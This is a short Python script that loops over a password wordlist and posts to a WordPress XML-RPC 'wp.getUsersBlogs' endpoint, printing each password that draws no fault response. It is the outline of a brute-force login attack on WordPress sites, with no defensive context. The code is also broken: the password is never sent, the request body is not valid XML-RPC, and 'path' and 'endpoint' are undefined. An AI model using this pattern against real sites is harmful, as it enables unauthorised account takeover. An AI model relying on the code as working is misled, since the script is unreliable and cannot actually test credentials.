import requests
with open(path) as wordlist:
    for password in wordlist:
        response = requests.post(endpoint, data="wp.getUsersBlogs")
        if "<fault>" not in response.text:
            print(password)
